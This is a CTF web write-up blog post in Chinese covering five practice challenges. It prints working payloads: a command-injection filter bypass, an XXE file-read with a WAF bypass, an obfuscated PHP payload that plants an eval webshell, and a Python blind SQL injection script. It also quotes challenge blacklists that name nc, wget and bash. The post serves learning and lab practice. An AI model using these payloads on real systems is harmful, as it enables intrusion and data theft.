@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-write up -ctf -web," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 继续刷NSSCTF，web的内容还是很杂的，多刷题还是能学到很多东西的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSCTF练习2">
+<meta property="og:url" content="http://example.com/2022/03/12/NSSCTF%E7%BB%83%E4%B9%A02/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 继续刷NSSCTF，web的内容还是很杂的，多刷题还是能学到很多东西的。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-12T08:20:08.000Z">
+<meta property="article:modified_time" content="2022-03-13T05:57:14.417Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-write up -ctf -web">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/03/12/NSSCTF练习2/"/>
+
+
+
+
+
+  <title>NSSCTF练习2 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/NSSCTF%E7%BB%83%E4%B9%A02/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">NSSCTF练习2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-12T16:20:08+08:00">
+                2022-03-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>继续刷NSSCTF，web的内容还是很杂的，多刷题还是能学到很多东西的。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="finalrce"><a href="#finalrce" class="headerlink" title="finalrce"></a>finalrce</h1><p>审计代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $url=$_GET[&#x27;url&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;,$url))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Sorry,you can&#x27;t use this.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Can you see anything?&quot;;</span><br><span class="line">        exec($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>这题也是过滤比较狠的rce，而且使用的是<code>exec()</code>，这个函数是没有回显的，按平常来说可以反弹shell，但这里的过滤太狠了，几乎堵死这条路了。因此我们要学习一个特殊的linux命令：<code>tee</code></p>
+<ul>
+<li>tee：将想要执行的命令写进文件中，当访问这个文件后执行命令</li>
+</ul>
+<p>因此我们构建这样的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /|tee mrl64 </span><br></pre></td></tr></table></figure>
+
+<p>接着我们访问<code>/mrl64</code>，就可以读取到根目录了，cat被过滤了，解决方法还是很多的，之前写到的无字符webshell就可以利用，也可以使用引号进行绕过，也可以用<code>sort</code>代替，等等，这里给出一种payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=sort /flllll&#x27;&#x27;aaaaaaggggggg|tee mrl64</span><br></pre></td></tr></table></figure>
+
+<h1 id="CSAWQual-2019-Unagi"><a href="#CSAWQual-2019-Unagi" class="headerlink" title="[CSAWQual 2019]Unagi"></a>[CSAWQual 2019]Unagi</h1><p>一进网页先到处翻翻，发现提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;users&gt;</span><br><span class="line">  &lt;user&gt;</span><br><span class="line">    &lt;username&gt;alice&lt;/username&gt;</span><br><span class="line">	&lt;password&gt;passwd1&lt;/password&gt;</span><br><span class="line">	&lt;name&gt;Alice&lt;/name&gt;</span><br><span class="line">	&lt;email&gt;alice@fakesite.com&lt;/email&gt;</span><br><span class="line">	&lt;group&gt;CSAW2019&lt;/group&gt;</span><br><span class="line">  &lt;/user&gt;</span><br><span class="line">  &lt;user&gt;</span><br><span class="line">	&lt;username&gt;bob&lt;/username&gt;</span><br><span class="line">	&lt;password&gt;passwd2&lt;/password&gt;</span><br><span class="line">	&lt;name&gt; Bob&lt;/name&gt;</span><br><span class="line">	&lt;email&gt;bob@fakesite.com&lt;/email&gt;</span><br><span class="line">	&lt;group&gt;CSAW2019&lt;/group&gt;</span><br><span class="line">  &lt;/user&gt;</span><br><span class="line">&lt;/users&gt;</span><br></pre></td></tr></table></figure>
+
+<p>明显的xee，结合提示flag在<code>/flag</code>下，我们直接构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE users[</span><br><span class="line">&lt;!ENTITY payload SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">  &lt;user&gt;</span><br><span class="line">	&lt;username&gt;bob&lt;/username&gt;</span><br><span class="line">	&lt;password&gt;passwd2&lt;/password&gt;</span><br><span class="line">	&lt;name&gt; Bob&lt;/name&gt;</span><br><span class="line">	&lt;email&gt;bob@fakesite.com&lt;/email&gt;</span><br><span class="line">	&lt;group&gt;CSAW2019&lt;/group&gt;</span><br><span class="line">	&lt;intro&gt;&amp;payload;&lt;/intro&gt;</span><br><span class="line">  &lt;/user&gt;</span><br><span class="line">&lt;/users&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传<code>1.xml</code>，结果发现有waf，尝试用utf-16编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf16 1.xml&gt;2.xml</span><br></pre></td></tr></table></figure>
+
+<p>再次上传即可获取flag。</p>
+<h1 id="hardrce-3"><a href="#hardrce-3" class="headerlink" title="hardrce_3"></a>hardrce_3</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;wllm&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $wllm = $_GET[&#x27;wllm&#x27;];</span><br><span class="line">    $blacklist = [&#x27; &#x27;,&#x27;\^&#x27;,&#x27;\~&#x27;,&#x27;\|&#x27;];</span><br><span class="line">    foreach ($blacklist as $blackitem)</span><br><span class="line">    &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123;</span><br><span class="line">        die(&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;);</span><br><span class="line">    &#125;&#125;</span><br><span class="line">if(preg_match(&#x27;/[a-zA-Z0-9]/is&#x27;,$wllm))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;Ra&#x27;sAlGhul说用字母数字是没有灵魂的！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;;</span><br><span class="line">eval($wllm);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;蔡总说：注意审题！！！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>这题把取反和异或全给禁了，我们采用自增的方式构建payload，记得url编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28041/?wllm=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%27%21%27%3D%3D%27%40%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就写入了一个webshell，查看phpinfo，发现一些系统函数被禁用，因此我们直接上传一个一句话：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php @eval($_POST[&#x27;mrl64&#x27;]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接即可。</p>
+<h1 id="鹤城杯-2021-Middle-magic"><a href="#鹤城杯-2021-Middle-magic" class="headerlink" title="[鹤城杯 2021]Middle magic"></a>[鹤城杯 2021]Middle magic</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;./flag.php&quot;;</span><br><span class="line">include &quot;./result.php&quot;;</span><br><span class="line">if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; strlen($_GET[&#x27;aaa&#x27;]) &lt; 20)&#123;</span><br><span class="line"></span><br><span class="line">    $aaa = preg_replace(&#x27;/^(.*)level(.*)$/&#x27;, &#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;, $_GET[&#x27;aaa&#x27;]);</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/pass_the_level_1#/&#x27;, $aaa))&#123;</span><br><span class="line">        echo &quot;here is level 2&quot;;</span><br><span class="line">        </span><br><span class="line">        if (isset($_POST[&#x27;admin&#x27;]) and isset($_POST[&#x27;root_pwd&#x27;])) &#123;</span><br><span class="line">            if ($_POST[&#x27;admin&#x27;] == $_POST[&#x27;root_pwd&#x27;])</span><br><span class="line">                echo &#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;;</span><br><span class="line">        // START FORM PROCESSING    </span><br><span class="line">            else if (sha1($_POST[&#x27;admin&#x27;]) === sha1($_POST[&#x27;root_pwd&#x27;]))&#123;</span><br><span class="line">                echo &quot;here is level 3,do you kown how to overcome it?&quot;;</span><br><span class="line">                if (isset($_POST[&#x27;level_3&#x27;])) &#123;</span><br><span class="line">                    $level_3 = json_decode($_POST[&#x27;level_3&#x27;]);</span><br><span class="line">                    </span><br><span class="line">                    if ($level_3-&gt;result == $result) &#123;</span><br><span class="line">                        </span><br><span class="line">                        echo &quot;success:&quot;.$flag;</span><br><span class="line">                    &#125;</span><br><span class="line">                    else &#123;</span><br><span class="line">                        echo &quot;you never beat me!&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                    echo &quot;out&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                </span><br><span class="line">                die(&quot;no&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        // perform validations on the form data</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    else&#123;</span><br><span class="line">        echo &#x27;nonono!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>第一关是传入aaa，要求内容为<code>pass_the_level_1#</code>，但是不能匹配到level，老考点了，这里用<code>%0a</code>截断。</p>
+<p>接着是第二关，POSTadmin参数和root_pwd参数，要求两者值不等但是sha1的值要相等，也是老考点，数组就行。</p>
+<p>最后一关，传入level_3参数，要求这个参数的内容经过json解码后的result的值能够等于$result。这个变量的值我们不知道，但不重要，result为0就可以了。</p>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?aaa=%0apass_the_level_1%23</span><br><span class="line">POST:admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="NCTF-2019-SQLi"><a href="#NCTF-2019-SQLi" class="headerlink" title="[NCTF 2019]SQLi"></a>[NCTF 2019]SQLi</h1><p>进入网页是一个登录框，同时还给了sql查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlquery : select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>尝试信息搜集，发现robots.txt，访问并发现hint.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>
+
+<p>看得出来，这过滤太狠毒了，但是又提示我们只要得到密码就可以了，这让我们想起了hgame第三周的那题盲注。但是like被过滤了，因此我们使用regexp来进行匹配。</p>
+<p>还有一点，如果直接从python传入<code>%00</code>会被转义，因此我们需要使用<code>parse.unquote(&#39;%00&#39;)</code>来避免这一情况。</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">from urllib import parse</span><br><span class="line"></span><br><span class="line">strs = string.ascii_lowercase + string.ascii_uppercase + string.digits + &quot;_&quot;</span><br><span class="line">url = &quot;http://1.14.71.254:28053/index.php&quot;</span><br><span class="line"></span><br><span class="line">name = &#x27;&#x27;</span><br><span class="line">for i in range(0, 100):</span><br><span class="line">    for j in strs:</span><br><span class="line">        z = name + j</span><br><span class="line">        payload = &quot;||passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format(z, parse.unquote(&#x27;%00&#x27;))</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;username&quot;: &quot;\\&quot;,</span><br><span class="line">            &quot;passwd&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        if &quot;welcome&quot; in r.text:</span><br><span class="line">            name += j</span><br><span class="line">            print(name)</span><br><span class="line">            break</span><br><span class="line">print(name)</span><br></pre></td></tr></table></figure>
+
+<p>获得密码后登陆得到flag。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/write-up-ctf-web/" rel="tag"># -write up -ctf -web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/03/11/buu%E7%BB%83%E4%B9%A06/" rel="next" title="buu练习6">
+                <i class="fa fa-chevron-left"></i> buu练习6
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
